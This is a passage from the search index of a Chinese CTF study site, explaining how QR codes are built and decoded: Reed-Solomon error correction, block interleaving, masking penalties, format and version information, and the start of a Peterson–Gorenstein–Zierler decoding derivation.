\u5305\u6765\u6c42\u89e3\uff1a</p> <pre><code>&gt;&gt;&gt; from reedsolo import RSCodec, ReedSolomonError\n&gt;&gt;&gt; rsc = RSCodec(7)\n&gt;&gt;&gt; list(rsc.encode([16, 32, 123, 114, 39, 0, 236, 17, 236, 17, 236, 17, 236, 17, 236, 17, 236, 17, 236]))\n[16, 32, 123, 114, 39, 0, 236, 17, 236, 17, 236, 17, 236, 17, 236, 17, 236, 17, 236, 188, 247, 62, 248, 53, 170, 224]\n&gt;&gt;&gt; list(rsc.encode([16, 32, 123, 114, 39, 0, 236, 17, 236, 17, 236, 17, 236, 17, 236, 17, 236, 17, 236]))[-7:]\n[188, 247, 62, 248, 53, 170, 224]\n</code></pre>"},{"location":"ctf/misc/qrcode/#76710","title":"\u5269\u4f59\u6b65\u9aa4\uff087.6~7.10\uff09","text":""},{"location":"ctf/misc/qrcode/#76","title":"\u5408\u6210\u5e8f\u5217\uff087.6\uff09","text":"<p>\u9996\u5148\u6309\u7167 2 \u4e2d\u6240\u8ff0\u7ed9\u5b8c\u6574\u4fe1\u606f\u7f16\u7801\u6210\u6570\u636e\u5e8f\u5217\uff0c\u5176\u4e2d\u4e5f\u5305\u542b padding bits\uff0c\u4e14\u957f\u5ea6\u4e3a 8 \u7684\u500d\u6570</p> <p>\u7136\u540e\u6839\u636e 3.1.1 \u4e2d\u6240\u8bf4\u5bf9\u6570\u636e\u5e8f\u5217\u8fdb\u884c\u5206\u5757\uff0c\u7136\u540e\u5bf9\u6bcf\u5757\u5206\u522b\u751f\u6210\u7ea0\u9519\u7801</p> <p>\u6700\u540e\u628a\u6570\u636e\u5e8f\u5217\u7684\u6240\u6709\u5757\u6309\u7167\u5b57\u8282\u4f9d\u6b21\u4ea4\u9519\u5408\u6210\u65b0\u7684\u6570\u636e\u5e8f\u5217\uff0c\u7136\u540e\u628a\u7ea0\u9519\u7801\u7684\u6240\u6709\u5757\u6309\u7167\u5b57\u8282\u4ea4\u9519\u5408\u6210\u7ea0\u9519\u7801\u5e8f\u5217\u3002\u628a\u65b0\u7684\u6570\u636e\u5e8f\u5217\u548c\u7ea0\u9519\u7801\u5e8f\u5217\u8fde\u63a5\u5728\u4e00\u8d77\uff0c\u5982\u679c\u603b\u957f\u5ea6\u4e0d\u591f\u4e8c\u7ef4\u7801\u7684\u5bb9\u91cf\uff0c\u5219\u5728\u540e\u9762\u8865\u5145 3/4/7 \u4e2a 0 \u6bd4\u7279\uff08\u9700\u8981\u8865\u591a\u5c11\u5728 Table 1 \u4e2d\u6709\u5b9a\u4e49\uff09</p> <p>\u800c\u4e14\u8fd9\u6837\u4e5f\u8981\u4fdd\u8bc1\u6700\u77ed\u7684\u6570\u636e\u5757\u5728\u6700\u524d\u9762\uff08\u5df2\u7ecf\u7531 Table 9 \u5b9a\u4e49\uff09</p> <p>\u6bd4\u5982 5-H \u7248\u672c\u7684\u5e8f\u5217\uff0c\u9700\u8981\u5206\u4e3a 4 \u5757\uff0c\u524d\u4e24\u5757\u662f 11 \u4e2a\u6570\u636e\u5b57\u300122 \u4e2a\u7ea0\u9519\u5b57\uff0c\u540e\u4e24\u5757\u662f 12 \u4e2a\u6570\u636e\u5b57\u300122 \u4e2a\u7ea0\u9519\u5b57\uff1a</p> <p></p> <p>\u6700\u540e\u7684\u5e8f\u5217\u5c31\u662f \\(D_1,D_{12},D_{23},D_{35},\\cdots,D_{45},D_{34},D_{46},E_1,E_{23},\\cdots,E_{88}\\)</p>"},{"location":"ctf/misc/qrcode/#77","title":"\u586b\u5145\u6570\u636e\uff087.7\uff09","text":"<p>\u628a\u524d\u9762\u5408\u6210\u7684\u5b8c\u6574\u6d88\u606f\u5e8f\u5217\u586b\u5230\u4e8c\u7ef4\u7801\u4e2d\uff0c\u9996\u5148\u8981\u5148\u586b\u5145\u529f\u80fd\u56fe\u6848\uff0c\u7136\u540e\u9884\u7559\u51fa\u683c\u5f0f\u4fe1\u606f\u3001\u7248\u672c\u4fe1\u606f\u7684\u4f4d\u7f6e</p> <p>\u586b\u5145\u65f6\u4ee5\u4e24\u5217\u4e3a\u5355\u4f4d\uff0c\u5373\u6bcf\u6b21\u4ea4\u66ff\u586b\u5145\u4e24\u5217\u3002\u4ece\u6700\u53f3\u4e0b\u89d2\u5f00\u59cb\u662f\u6700\u9ad8\u4f4d\u7684\u6bd4\u7279\uff0c\u7136\u540e\u4ece\u53f3\u5411\u5de6\u4ece\u4e0b\u5411\u4e0a\u4ea4\u66ff\u586b\u5145\uff0c\u5230\u4e86\u4e0a\u754c\u65f6\u5de6\u8f6c\u5411\u4e0b\u7ee7\u7eed\u586b\u5145\uff0c\u9047\u5230\u5bf9\u9f50\u56fe\u6848\u76f4\u63a5\u7a7f\u8fc7\uff0c\u9047\u5230\u5bf9\u9f50\u56fe\u6848\u8fb9\u754c\u5219\u53d8\u4e3a\u4e00\u884c</p> <p>\u4e5f\u53ef\u4ee5\u6309\u7167\u5b57\u8282\u6765\u4f9d\u6b21\u586b\u5145\uff0c\u5982\u679c\u662f\u5411\u4e0a\u586b\u5145\uff0c\u5219\u6700\u9ad8\u4f4d\u5728\u4e0b\u7aef\uff0c\u53cd\u4e4b\u5728\u4e0a\u6bb5\u3002\u6bcf\u4e2a\u5b57\u8282\u5757\u5185\u7684\u6700\u9ad8\u4f4d\u5c3d\u91cf\u53d6\u6700\u53f3\u4fa7\u7684\uff0c\u4f46\u5982\u679c\u6700\u4e0b(\u4e0a)\u7aef\u53ea\u6709\u4e00\u4e2a\u6bd4\u7279\u7684\u4f4d\u7f6e\uff0c\u5219\u9009\u5b83\u4f5c\u4e3a\u6700\u9ad8\u6bd4\u7279\u7684\u4f4d\u7f6e</p> <p>\u53cd\u6b63\u6309\u987a\u5e8f\u6b63\u5e38\u586b\u5c31\u884c\u4e86\uff0c\u9047\u5230\u4e1c\u897f\u5c31\u7ed5</p> \u5177\u4f53\u89c4\u5219 <p></p> <p></p> <p></p> <p></p> <p></p>"},{"location":"ctf/misc/qrcode/#78","title":"\u63a9\u7801\u906e\u76d6\uff087.8\uff09","text":"<p>\u586b\u5145\u540e\u7684\u6570\u636e\u8fd8\u8981\u906e\u76d6\u4e00\u5c42\u63a9\u7801\uff08\u5f02\u6216\uff09\u6765\u5e73\u8861\u9ed1\u767d\u5757\u7684\u6570\u91cf\uff0c\u4ee5\u53ca\u51cf\u5c11\u5bb9\u6613\u4ea7\u751f\u626b\u63cf\u9519\u8bef\u7684\u5927\u5757\u548c\u5f62\u4f3c\u529f\u80fd\u56fe\u6848\u7684\u90e8\u5206\u51fa\u73b0</p> <p>QR \u7801\u4e00\u5171\u6709 8 \u79cd\u63a9\u7801\uff0c\u6bcf\u4e2a\u63a9\u7801\u6709\u4e00\u4e2a 3 bits \u7684\u7f16\u53f7\uff0c\u548c\u4e00\u4e2a\u751f\u6210\u516c\u5f0f\u3002\u8fd9\u4e2a\u516c\u5f0f\u7528\u6765\u751f\u6210\u63a9\u7801\u56fe\u6837\uff0c\u4ee5\u5de6\u4e0a\u4e3a\u539f\u70b9\uff0c\u5411\u53f3\u3001\u4e0b\u4e3a\u6b63\u65b9\u5411\uff0c\u5750\u6807\u6ee1\u8db3\u8fd9\u4e2a\u516c\u5f0f\u7684\u70b9\u5728\u56fe\u6837\u4e2d\u662f\u9ed1\u8272\uff081\uff09\uff0c\u4e0d\u6ee1\u8db3\u7684\u662f\u767d\u8272\uff080\uff09\u3002\u5728\u7248\u672c 1 \u4e2d\u7684\u63a9\u7801\u56fe\u50cf\u8868\u73b0\u4e3a\uff1a</p> <p></p> <p>\u8fdb\u884c\u63a9\u7801\u64cd\u4f5c\u5c31\u662f\u628a\u9664\u53bb\u529f\u80fd\u56fe\u6848\u548c\u7248\u672c\u4fe1\u606f\u3001\u683c\u5f0f\u4fe1\u606f\u4e4b\u5916\u7684\u6570\u636e\u90e8\u5206\u6bcf\u4e00\u5757\u7684\u503c\u4e0e\u63a9\u7801\u56fe\u6837\u5f02\u6216</p> <p>\u6574\u4e2a\u64cd\u4f5c\u9700\u8981\u751f\u6210\u5206\u522b\u4f7f\u7528\u4e0d\u540c\u63a9\u7801\u7684 8 \u4e2a\u56fe\u6837\uff0c\u7136\u540e\u8ba1\u7b97\u51fa\u635f\u5931\u5206\u6570\uff08penalty points score\uff09\uff0c\u7136\u540e\u91c7\u7528\u635f\u5931\u5206\u6570\u6700\u5c0f\u7684\u63a9\u7801\u6a21\u5f0f\u4f5c\u4e3a\u6700\u7ec8\u7684\u63a9\u7801\u6a21\u5f0f</p>"},{"location":"ctf/misc/qrcode/#783","title":"\u8ba1\u7b97\u635f\u5931\u5206\u6570\uff087.8.3\uff09","text":"<p>\u867d\u7136\u8fdb\u884c\u63a9\u7801\u64cd\u4f5c\u65f6\u4ec5\u5bf9\u975e\u529f\u80fd\u56fe\u6848\u3001\u975e\u7248\u672c\u4fe1\u606f\u683c\u5f0f\u4fe1\u606f\u7684\u6570\u636e\u533a\u57df\u8fdb\u884c\u63a9\u7801\uff0c\u4f46\u662f\u8ba1\u7b97\u635f\u5931\u5206\u6570\u65f6\u6309\u7167\u6574\u4e2a\u4e8c\u7ef4\u7801\u8ba1\u7b97</p> <p>\u8ba1\u7b97\u635f\u5931\u5206\u6709\u56db\u4e2a\u89c4\u5219\uff1a</p> <ul> <li>\u76f8\u90bb\u4e00\u884c\u6216\u4e00\u5217\u5185\u51fa\u73b0\u8fde\u7eed\u4e94\u4e2a\u76f8\u540c\u989c\u8272\u5757\u65f6\u635f\u5931\u5206 +3\uff0c\u4e4b\u540e\u8fde\u7eed\u5757\u6570\u6bcf\u52a0\u4e00\uff0c\u635f\u5931\u5206 +1</li> <li>\u5bfb\u627e\u5185\u90e8\u989c\u8272\u76f8\u540c\u7684 2*2 \u7684\u5757\uff0c\u6bcf\u51fa\u73b0\u4e00\u4e2a\u635f\u5931\u5206 +3</li> <li>\u5728\u6bcf\u884c\u548c\u6bcf\u5217\u4e2d\u5bfb\u627e <code>10111010000</code> \u548c <code>00001011101</code> \uff0c\u6bcf\u51fa\u73b0\u4e00\u4e2a\u635f\u5931\u5206 +40</li> <li>\u8bc4\u4f30\u9ed1\u8272\u5757\u5360\u5168\u90e8\u5757\u6570\u7684\u6bd4\u4f8b\uff0c\u5982\u679c\u5728 45%~55% \u95f4\u5219\u4e0d\u589e\u52a0\u635f\u5931\u5206\uff0c\u5728 40%~45%\u300155%~60% \u95f4\u5219\u635f\u5931\u5206 +10\uff0c\u5728 35%~40%\u300160%~65% \u95f4\u5219\u635f\u5931\u5206 +10*2\uff0c\u4ee5\u6b64\u7c7b\u63a8</li> </ul> <p>\u66f4\u8be6\u7ec6\u7684\u4f8b\u5b50\u53ef\u4ee5\u770b\uff1ahttps://www.thonky.com/qr-code-tutorial/data-masking</p> <p>\u7136\u540e\u5bf9\u6240\u6709\u63a9\u7801\u7ed3\u679c\u8ba1\u7b97\u635f\u5931\u5206\u6570\u540e\u9009\u62e9\u5206\u6570\u6700\u4f4e\u7684\u4e00\u4e2a\u4f5c\u4e3a\u6700\u7ec8\u7ed3\u679c</p>"},{"location":"ctf/misc/qrcode/#79","title":"\u683c\u5f0f\u4fe1\u606f\uff087.9\uff09","text":"<p>QRCode \u7684\u683c\u5f0f\u4fe1\u606f\u662f 15 bits \u7684\u5e8f\u5217\uff0c\u5176\u4e2d\u524d 5 \u4f4d\u662f\u6570\u636e\uff0c\u540e 10 \u4f4d\u662f\u9488\u5bf9\u683c\u5f0f\u4fe1\u606f\u7684\u7ea0\u9519\u7801\uff08\u7531 (15, 5) BCH \u7801\u751f\u6210\uff09</p> <p>5 bits \u7684\u6570\u636e\u524d 2 \u4f4d\u662f\u7ea0\u9519\u7b49\u7ea7\u6807\u8bc6\u7b26\uff0c\u5206\u522b\u662f L -&gt; <code>01</code> \u3001M -&gt; <code>00</code> \u3001Q -&gt; <code>11</code> \u3001H -&gt; <code>10</code></p> <p>\u540e 3 \u4f4d\u662f\u4e0a\u9762\u8bf4\u5230\u7684\u63a9\u7801\u7f16\u53f7</p> <p>\u7136\u540e\u540e\u63a5 10 bits \u7ea0\u9519\u7801\uff0c\u6700\u540e\u6574\u4f53\u5f02\u6216 <code>101010000010010</code> \u9632\u6b62\u4ea7\u751f\u5168\u96f6\u6570\u636e\u5e8f\u5217</p>"},{"location":"ctf/misc/qrcode/#annex-c","title":"\u751f\u6210\u7ea0\u9519\u7801\uff08Annex C\uff09","text":"<p>\u5148\u5f97\u5230\u524d 5 bits \u7684\u6570\u636e\uff0c\u7136\u540e\u5316\u4e3a\u591a\u9879\u5f0f\uff0c\u6574\u4f53\u4e58 \\(x^{10}\\)\uff0c\u518d\u9664\u4ee5\u751f\u6210\u591a\u9879\u5f0f \\(G(x)=x^{10}+x^8+x^5+x^4+x^2+x+1\\) \u5f97\u5230\u4f59\u6570\u8f6c\u6362\u4e3a\u540e 10 bits \u7684\u7ea0\u9519\u7801</p> \u4f8b\u5b50 <ul> <li>\u7ea0\u9519\u7b49\u7ea7 M\uff0c\u63a9\u7801\u7f16\u53f7 101</li> <li>5 bits \u6570\u636e\uff1a <code>00101</code></li> <li>\u5199\u4e3a\u591a\u9879\u5f0f\uff1a \\(x^2+1\\)</li> <li>\u6574\u4f53\u4e58 \\(x^{10}\\)\uff1a \\(x^{12}+x^{10}\\)</li> <li>\u9664\u4ee5 \\(G(x)\\)\uff1a \u5546 \\(x^2\\)\uff0c\u4f59\u6570 \\(x^7+x^6+x^4+x^3+x^2\\)</li> <li>\u4f59\u6570\u8f6c\u4e3a 10 bits \u7ea0\u9519\u7801\uff1a <code>0011011100</code></li> <li>\u52a0\u4e0a\u539f\u6570\u636e\uff1a <code>001010011011100</code></li> <li>\u5f02\u6216 <code>101010000010010</code>\uff1a <code>100000011001110</code></li> </ul> <p>\u56e0\u4e3a 5 bits \u7684\u6570\u636e\u4e00\u5171\u53ea\u6709 32 \u79cd\u60c5\u51b5\uff0c\u6240\u4ee5\u9644\u5f55 C \u4e2d\u76f4\u63a5\u7ed9\u51fa\u4e86\u5b8c\u6574\u7684\u8868\u683c\uff1a</p> <p></p> <p>\u7ea0\u9519\uff1a\u6700\u591a\u53ef\u4ee5\u7ea0\u6b63 3 bits \u7684\u9519\u8bef\uff0c\u5148\u628a\u683c\u5f0f\u4fe1\u606f\u5f02\u6216 <code>101010000010010</code> \u5f97\u5230\u539f\u59cb\u5e8f\u5217\uff0c\u7136\u540e\u4e0e Table C.1 \u4e2d\u7684\u6709\u6548\u683c\u5f0f\u4fe1\u606f\u8fdb\u884c\u5bf9\u6bd4\uff0c\u5982\u679c\u627e\u4e0d\u5230\u8bf4\u660e\u6709\u9519\u8bef\u3002\u6b64\u65f6\u4ec5\u9009\u62e9 Table C.1 \u4e2d\u4e0e\u9519\u8bef\u683c\u5f0f\u4fe1\u606f\u76f8\u5dee\u6bd4\u7279\u6700\u5c11\u7684\u4e00\u4e2a\u4f5c\u4e3a\u7ea0\u6b63\u540e\u7684\u683c\u5f0f\u4fe1\u606f\u5373\u53ef\uff0c\u5982\u679c\u76f8\u5dee\u5c11\u4e8e\u7b49\u4e8e 3 \u4e2a\u6bd4\u7279\uff0c\u5219\u89c6\u4e3a\u7ea0\u6b63\u6210\u529f</p>"},{"location":"ctf/misc/qrcode/#_5","title":"\u586b\u5165\u4e8c\u7ef4\u7801","text":"<p>\u5de6\u4e0a\u89d2\u7684\u683c\u5f0f\u4fe1\u606f\u533a\u57df\u586b\u5145\u4e00\u4efd\u5b8c\u6574\u7684\u683c\u5f0f\u4fe1\u606f\uff08\u6700\u9ad8\u4f4d\u5728\u5de6\uff09\uff0c\u5de6\u4e0b\u89d2\u548c\u53f3\u4e0a\u89d2\u5408\u8d77\u6765\u662f\u4e00\u4efd\u5b8c\u6574\u7684\u683c\u5f0f\u4fe1\u606f\uff08\u6700\u9ad8\u4f4d\u5728\u5de6\u4e0b\u89d2\u7684\u6700\u4e0b\uff0c\u6700\u4f4e\u4f4d\u5728\u53f3\u4e0a\u89d2\u7684\u6700\u53f3\uff09\u3002\u5e76\u4e14\u5de6\u4e0b\u89d2\u7684\u683c\u5f0f\u4fe1\u606f\u4e0a\u65b9\uff08\u4f4d\u7f6e<code>(4V+9,8)</code>\uff09\u6709\u4e00\u5757\u59cb\u7ec8\u662f\u9ed1\u8272\uff1a</p> <p></p>"},{"location":"ctf/misc/qrcode/#710","title":"\u7248\u672c\u4fe1\u606f\uff087.10\uff09","text":"<p>\u5728\u7248\u672c 7 \u53ca\u4ee5\u4e0a\u7684\u4e8c\u7ef4\u7801\u4e2d\u9700\u8981\u586b\u5165\u7248\u672c\u4fe1\u606f\u6765\u786e\u4fdd\u51c6\u786e\u5ea6</p> <p>\u7248\u672c\u4fe1\u606f\u53ea\u50a8\u5b58\u4e86\u8be5\u4e8c\u7ef4\u7801\u7684\u7248\u672c\u53f7\uff087\uff5e40\uff09\uff0c\u4e00\u5171 18 bits\uff0c\u524d 6 bits \u4e3a\u7248\u672c\u53f7\u7684\u4e8c\u8fdb\u5236\uff08\u4ece <code>000111</code> \u5230 <code>101000</code>\uff09\uff0c\u540e 12 bits \u4e3a\u7531 (18, 6) Golay code \u751f\u6210\u7684\u7ea0\u9519\u7801</p> <p>\u4e0d\u540c\u4e8e\u683c\u5f0f\u4fe1\u606f\uff0c\u56e0\u4e3a\u7248\u672c\u53f7\u4e0d\u4f1a\u51fa\u73b0\u5168\u96f6\uff0c\u6240\u4ee5\u4e0d\u9700\u8981\u8fdb\u884c\u63a9\u7801\u64cd\u4f5c</p>"},{"location":"ctf/misc/qrcode/#annex-d","title":"\u751f\u6210\u7ea0\u9519\u7801\uff08Annex D\uff09","text":"<p>\u548c\u683c\u5f0f\u4fe1\u606f\u7684\u7ea0\u9519\u7801\u7c7b\u4f3c\uff0c\u5148\u628a\u524d 6 bits \u8f6c\u4e3a\u591a\u9879\u5f0f\uff0c\u7136\u540e\u6574\u4f53\u4e58 \\(x^{12}\\)\uff0c\u5f97\u5230\u7684\u7ed3\u679c\u9664\u4ee5\u751f\u6210\u591a\u9879\u5f0f \\(G(x)=x^{12}+x^{11}+x^{10}+x^9+x^8+x^5+x^2+1\\) \uff0c\u628a\u4f59\u6570\u8f6c\u4e3a 12 bits \u4e8c\u8fdb\u5236\u5c31\u662f\u7ea0\u9519\u7801\u4e86</p> <p>\u56e0\u4e3a\u53ea\u6709 34 \u4e2a\u7248\u672c\u6709\u7248\u672c\u4fe1\u606f\uff0c\u6240\u4ee5\u4e5f\u5c31\u53ea\u6709 34 \u79cd\u6709\u6548\u7684\u7248\u672c\u4fe1\u606f\u5e8f\u5217\uff0c\u9644\u5f55 D \u7684 Table D.1 \u4e2d\u7ed9\u51fa\u4e86\u5b8c\u6574\u7684 34 \u4e2a\u7248\u672c\u4fe1\u606f\u5e8f\u5217</p> <p></p> <p>\u548c\u683c\u5f0f\u4fe1\u606f\u4e00\u6837\uff0c\u7ea0\u9519\u65f6\u5bf9\u7167\u8868\u683c\u9009\u62e9\u76f8\u5dee\u6bd4\u7279\u6570\u6700\u5c0f\u7684\u5373\u53ef\u3002\u5e76\u4e14\u7248\u672c\u4fe1\u606f\u4e5f\u53ea\u80fd\u7ea0\u6b63\u5c0f\u4e8e\u7b49\u4e8e 3 \u4e2a\u9519\u8bef</p>"},{"location":"ctf/misc/qrcode/#_6","title":"\u586b\u5165\u4e8c\u7ef4\u7801","text":"<p>\u5728\u7248\u672c 7 \u4ee5\u4e0a\u7684\u4e8c\u7ef4\u7801\u4e2d\u5df2\u7ecf\u9884\u7559\u51fa\u4e86\u4e24\u4e2a 6*3 \u5927\u5c0f\u7684\u533a\u57df\uff0c\u4e00\u4e2a\u4f4d\u4e8e\u5de6\u4e0b\u5206\u5272\u7ebf\u7684\u4e0a\u65b9\u65f6\u5e8f\u56fe\u6848\u5de6\u4fa7\uff0c\u4e00\u4e2a\u4f4d\u4e8e\u53f3\u4e0a\u5206\u5272\u7ebf\u5de6\u4fa7\u65f6\u5e8f\u56fe\u6848\u7684\u4e0a\u65b9</p> <p>\u6309\u7167\u4e0b\u56fe\u987a\u5e8f\u586b\u5165\u5373\u53ef\uff1a</p> <p></p>"},{"location":"ctf/misc/qrcode/#11annex-b","title":"\u89e3\u7801\uff0811\u3001Annex B\uff09","text":"<p>\u7b80\u8981\u7684\u89e3\u7801\u8fc7\u7a0b\uff1a</p> <ol> <li>\u5b9a\u4f4d\u5e76\u83b7\u53d6\u56fe\u50cf\u4e2d\u7684\u4e8c\u7ef4\u7801\uff0c\u5e76\u628a\u56fe\u50cf\u4e2d\u7684\u9ed1\u767d\u5757\u63d0\u53d6\u4e3a 1 \u548c 0</li> <li>\u8bfb\u53d6\u683c\u5f0f\u4fe1\u606f<ul> <li>\u91ca\u653e\u63a9\u7801 <code>101010000010010</code></li> <li>\u8fdb\u884c\u7ea0\u9519</li> <li>\u5982\u679c\u7ea0\u9519\u5931\u8d25\u5219\u5c06\u4e8c\u7ef4\u7801\u955c\u9762\u5bf9\u79f0\u518d\u5c1d\u8bd5</li> </ul> </li> <li>\u8bfb\u53d6\u7248\u672c\u4fe1\u606f\uff08\u5982\u679c\u6709\u7684\u8bdd\uff09</li> <li>\u8bfb\u53d6\u683c\u5f0f\u4fe1\u606f\u4e2d\u7684\u63a9\u7801\u7f16\u53f7\uff0c\u5e76\u91ca\u653e\u63a9\u7801</li> <li>\u8bfb\u53d6\u5e76\u6062\u590d\u6570\u636e\u5b57\u548c\u7ea0\u9519\u5b57</li> <li>\u7ea0\u9519\uff0c\u5982\u679c\u68c0\u6d4b\u5230\u4e86\u9519\u8bef\u5c31\u7ea0\u6b63</li> <li>\u628a\u6570\u636e\u5b57\u89e3\u7801\u5f97\u5230\u7ed3\u679c</li> </ol>"},{"location":"ctf/misc/qrcode/#annex-b","title":"\u7ea0\u9519\uff08Annex B\uff09","text":"<p>Annex B \u8bb2\u7684\u7ea0\u9519\u8fc7\u7a0b\u5f88\u7b80\u7565\uff0c\u800c\u4e14\u7b26\u53f7\u8bf4\u660e\u4e0d\u5168\uff0c\u5f88\u96be\u770b\u61c2</p> <p>\u53bb\u5b66\u4e86\u5b66 PGZ \u89e3\u7801\uff1aReed\u2013Solomon_error_correction#Peterson\u2013Gorenstein\u2013Zierler_decoder</p> <p>\u8bbe\u5f53\u524d\u7248\u672c\u4e0b\u6bcf\u5757\u4e2d\u6709 \\(n\\) \u4e2a\u5b57\uff0c\\(k\\) \u4e2a\u6570\u636e\u5b57\uff0c\\(n-k\\) \u4e2a\u7ea0\u9519\u5b57\uff0c\u7ea0\u9519\u5bb9\u91cf\u4e3a \\(\\nu\\)</p> <p>\u9996\u5148\u5b9a\u4e49\u539f\u6765\u7684\u5b8c\u6574\u6570\u636e\uff08\u5373\u6570\u636e\u5b57\u548c\u7ea0\u9519\u5b57\uff09\u4ece\u9ad8\u4f4d\u5230\u4f4e\u4f4d\u4e3a \\(c_{n-1},c_{n-2},\\cdots,c_0\\) \uff0c\u5bf9\u5e94\u591a\u9879\u5f0f\u4e3a\uff1a</p> \\[s(x)=\\sum_{i=0}^{n-1}c_ix^i=c_{n-1}x^{n-1}+c_{n-2}x^{n-2}+\\cdots+c_0\\] <p>\u800c\u4e14\u6839\u636e\u7ea0\u9519\u7801\u751f\u6210\u539f\u7406\uff0c\\(s(x)\\) \u53ef\u4ee5\u88ab\u751f\u6210\u591a\u9879\u5f0f \\(g(x)\\) \u6574\u9664\uff0c\u5176\u4e2d</p> \\[g(x)=\\prod_{i=0}^{n-k-1}(x-\\alpha^i)\\] <p>\u6240\u4ee5 \\(s(x)\\) \u4e5f\u6709\u6839 \\(s(\\alpha^i)=0, i=0,1,\\dots n-k-1\\)</p> <p>\u518d\u8bbe\u63a5\u6536\u5230\u7684\u6d88\u606f\u591a\u9879\u5f0f\uff08\u53ef\u80fd\u6709\u9519\uff09\u4e3a \\(r(x)\\) \uff0c\u8bef\u5dee\u591a\u9879\u5f0f\u4e3a \\(e(x)\\) \uff0c\u6ee1\u8db3\uff1a</p> \\[r(x)=s(x)+e(x),\\quad e(x)=\\sum_{i=0}^{n-1}e_ix^i\\] <p>\u5148\u8bbe\u4e00\u5171\u6709 \\(\\nu\\) \u4e2a\u9519\u8bef\uff0c\u4e14\u6bcf\u4e2a\u9519\u8bef\u7684\u4f4d\u7f6e\u4e3a \\(i_k,k=0,1,\\dots \\nu-1\\)\uff0c\u6240\u4ee5\u6709\uff1a</p> \\[e(x)=\\sum_{k=0}^{\\nu-1}e_{i_k}x^{i_k}\\] <p>\u6700\u7ec8\u7684\u76ee\u6807\u5c31\u662f\u627e\u5230\u9519\u8bef\u4e2a\u6570 \\(\\nu\\)\uff0c\u9519\u8bef\u4f4d\u7f6e \\(i_k\\)\uff0c\u4ee5\u53ca\u9519\u8bef\u5927\u5c0f \\(e_{i_k}\\)</p>"},{"location":"ctf/misc/qrcode/#_7","title":"\u8ba1\u7b97\u5178\u578b\u503c","text":"<p>\u9996\u5148\u5b9a\u4e49\u5178\u578b\u503c\uff08syndromes\uff09\u4e3a\u628a \\(\\alpha^j\\) \u4f20\u5165 \\(r(x)\\) \u5f97\u5230\u7684\u503c \\(S_j\\)\uff0c\u6709\uff1a</p> \\[S_j=r(\\alpha^j)=s(\\alpha^j)+e(\\alpha^j)=e(\\alpha^j)=\\sum_{k=0}^{\\nu-1}e_{i_k}(\\alpha^j)^{i_k},j=0,1,\\dots,n-k-1\\] <p>\u6b64\u65f6\u5982\u679c\u5f97\u5230\u7684\u5178\u578b\u503c\u90fd\u4e3a 0\uff0c\u90a3\u8bf4\u660e\u6ca1\u6709\u9519\u8bef</p> <p>\u4e3a\u4e86\u65b9\u4fbf\uff0c\u518d\u4ee4 \\(X_k=\\alpha^{i_k},Y_k=e_{i_k}\\)\uff0c\u8fd9\u6837 \\(X_k\\) \u4e5f\u80fd\u7528\u6765\u5b9a\u4f4d\u9519\u8bef\uff0c\u540c\u65f6\u4e5f\u6709\uff1a</p> \\[S_j=\\sum_{k=0}^{\\nu-1}Y_kX_k^j\\] <p>\u5199\u6210\u77e9\u9635\u5f62\u5f0f\u5c31\u662f\uff1a</p> \\[\\begin{bmatrix} X_0^0 &amp;X_2^0 &amp;\\cdots &amp;X_{\\nu-1}^0\\\\\\\\ X_0^1 &amp;X_1^1 &amp;\\cdots &amp;X_{\\nu-1}^1\\\\\\\\ \\vdots &amp;\\vdots &amp; &amp;\\vdots\\\\\\\\ X_0^{n-k-1} &amp;X_1^{n-k-1} &amp;\\cdots &amp;X_{\\nu-1}^{n-k-1} \\end{bmatrix} \\begin{bmatrix} Y_0\\\\\\\\Y_1\\\\\\\\\\vdots\\\\\\\\Y_{\\nu-1} \\end{bmatrix}= \\begin{bmatrix} S_0\\\\\\\\S_1\\\\\\\\\\vdots\\\\\\\\S_{n-k-1} \\end{bmatrix}\\] <p>\u6240\u4ee5\u53ea\u8981\u6c42\u5f97\u4f4d\u7f6e \\(X_k\\) \u5c31\u80fd\u5f97\u5230\u9519\u8bef\u5927\u5c0f\uff0c\u4f46\u662f\u6b64\u65f6\u5e76\u4e0d\u662f\u7ebf\u6027\u7684</p>"},{"location":"ctf/misc/qrcode/#_8","title":"\u9519\u8bef\u5b9a\u4f4d\u591a\u9879\u5f0f","text":"<p>\u5b9a\u4e49\u4e00\u4e2a\u9519\u8bef\u5b9a\u4f4d\u591a\u9879\u5f0f\uff08error locator polynomial\uff09\\(\\Lambda(x)\\)\uff1a</p> \\[\\Lambda(x)=\\prod_{k=0}^{\\nu-1}(1-xX_k)=1+\\Lambda_1x+\\Lambda_2x^2+\\cdots+\\Lambda_\\nu x^\\nu\\] <p>\u53ef\u4ee5\u770b\u51fa \\(\\Lambda(X_k^{-1})=0\\)\uff0c\u6240\u4ee5\u5bf9\u4e8e \\(0\\leq j\\leq\\nu-1\\) \u6709\uff1a</p> \\[ Y_kX_k^{j+\\nu}\\Lambda(X_k^{-1}) =0 \\] \\[ Y_{k}X_{k}^{j+\\nu }(1+\\Lambda _{1}X_{k}^{-1}+\\Lambda _{2}X_{k}^{-2}+\\cdots +\\Lambda _{\\nu }X_{k}^{-\\nu })=0 \\] \\[ Y_{k}X_{k}^{j+\\nu }+\\Lambda _{1}Y_{k}X_{k}^{j+\\nu }X_{k}^{-1}+\\Lambda _{2}Y_{k}X_{k}^{j+\\nu }X_{k}^{-2}+\\cdots +\\Lambda _{\\nu }Y_{k}X_{k}^{j+\\nu }X_{k}^{-\\nu }=0 \\] \\[ Y_{k}X_{k}^{j+\\nu }+\\Lambda _{1}Y_{k}X_{k}^{j+\\nu -1}+\\Lambda _{2}Y_{k}X_{k}^{j+\\nu -2}+\\cdots +\\Lambda _{\\nu }Y_{k}X_{k}^{j}=0 \\] <p>\u6240\u4ee5\u628a \\(k\\) \u4ece \\(0\\) \u5230 \\(\\nu-1\\) \u7d2f\u52a0\u8d77\u6765\u4e5f\u4e3a 0\uff1a</p> \\[\\sum_{k=0}^{\\nu-1}\\left(Y_{k}X_{k}^{j+\\nu }+\\Lambda _{1}Y_{k}X_{k}^{j+\\nu -1}+\\Lambda _{2}Y_{k}X_{k}^{j+\\nu -2}+\\cdots +\\Lambda _{\\nu }Y_{k}X_{k}^{j}\\right)=0\\] <p>\u7136\u540e\u8f6c\u6362\u4e3a\u6bcf\u9879\u7d2f\u52a0\u5e76\u63d0\u53d6\u51fa \\(\\Lambda_i\\)\uff1a</p> \\[\\left(\\sum _{k=1}^{\\nu }Y_{k}X_{k}^{j+\\nu }\\right)+\\Lambda _{1}\\left(\\sum _{k=1}^{\\nu }Y_{k}X_{k}^{j+\\nu -1}\\right)+\\cdots +\\Lambda _{\\nu }\\left(\\sum _{k=1}^{\\nu 